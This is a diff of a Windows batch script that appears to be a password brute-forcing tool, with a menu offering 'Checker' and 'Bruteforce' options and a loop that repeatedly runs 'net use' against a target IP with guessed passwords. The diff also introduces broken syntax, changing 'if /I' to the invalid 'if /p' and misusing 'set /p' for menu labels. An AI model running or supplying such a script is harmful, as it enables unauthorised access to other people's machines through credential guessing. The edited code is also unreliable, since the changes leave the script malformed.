@@ -24,12 +24,12 @@ pause
 echo [16:00] - [STARTUP] - 1
 pause
 echo #
-set /p [16:00] - Insert key : "
+echo [16:00] - Insert key : "
 echo [16:00] - Whitelisted.
-set /I [1] Checker
-set /I [2] Bruteforce
-if /I %input% EQU 1 start Checker.bat
-if /I %input% EQU 2 start BRUTEFORCE.bat
+set /p [1] Checker
+set /p [2] Bruteforce
+if /p %input% EQU 1 start Checker.bat
+if /p %input% EQU 2 start BRUTEFORCE.bat
 
 echo #
 
@@ -53,6 +53,7 @@ exit
 net use \\%ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
+
 
 
 
